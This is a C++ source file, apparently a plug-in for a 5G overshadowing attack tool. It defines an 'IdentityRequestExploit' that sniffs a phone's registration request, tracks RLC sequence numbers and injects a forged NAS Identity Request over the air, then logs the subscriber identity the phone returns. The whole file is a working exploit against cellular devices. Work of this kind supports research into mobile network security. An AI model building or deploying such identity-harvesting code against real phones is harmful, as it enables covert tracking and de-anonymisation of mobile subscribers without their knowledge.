#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

const uint8_t identity_request_raw[] = {0x01, 0x03, 0x00, 0x01,
                                        0x00, // ACK SN = 1
                                        0x01, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x28, 0x80, 0x8f, 0xc0,
                                        0x0b, 0x60, 0x20, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00};

class IdentityRequestExploit : public Exploit
{
public:
  IdentityRequestExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                         SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    identity_request.reset(
        new std::vector<uint8_t>(identity_request_raw, identity_request_raw + sizeof(identity_request_raw)));
  }

  void setup() override
  {
    f_registration_request = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x41");
    filters.push_back(f_registration_request);
    f_identity_response = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x5c");
    filters.push_back(f_identity_response);
    f_rrc_setup_request = ws_filter_t::make_filter("nr-rrc.c1 == 0");
    filters.push_back(f_rrc_setup_request);

    f_msin = ws_field_t::make_field_string("nas-5gs.mm.suci.msin");
    fields.push_back(f_msin);
    f_ack_sn = ws_field_t::make_field_uint32("rlc-nr.am.ack-sn");
    fields.push_back(f_ack_sn);
    f_sn = ws_field_t::make_field_uint32("rlc-nr.am.sn");
    fields.push_back(f_sn);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (f_registration_request->match) {
      logger.info("Received registration request");
      if (f_msin->has_string) {
        logger.info(RED "Identity: %s" RESET, f_msin->string_value);
      }
    }

    if (direction == UL) {
      if (f_ack_sn->has_uint32) {
        logger.info("Received ACK SN: %u", f_ack_sn->uint32_value);
        if (f_ack_sn->uint32_value > dl_sn) {
          dl_sn = f_ack_sn->uint32_value;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      if (f_sn->has_uint32) {
        uint32_t sn_recv = f_sn->uint32_value;
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      if (f_rrc_setup_request->match) {
        logger.info("Received RRC Setup Request, resetting sequence numbers");
        // Reset the sequence number
        dl_sn     = 0;
        dl_ack_sn = 1;
      }
    }

    if (f_registration_request->match) {
      send_identity_request();
      logger.info("Sent identity request");
    }
  }

private:
  void send_identity_request()
  {
    identity_request->data()[3]  = dl_ack_sn & 0xff;
    identity_request->data()[8]  = dl_sn & 0xff;
    identity_request->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(identity_request);
  }

  std::shared_ptr<ws_filter_t> f_registration_request;
  std::shared_ptr<ws_filter_t> f_rrc_setup_request;
  std::shared_ptr<ws_filter_t> f_identity_response;
  std::shared_ptr<ws_field_t>  f_msin;
  std::shared_ptr<ws_field_t>  f_ack_sn;
  std::shared_ptr<ws_field_t>  f_sn;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > identity_request;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new IdentityRequestExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}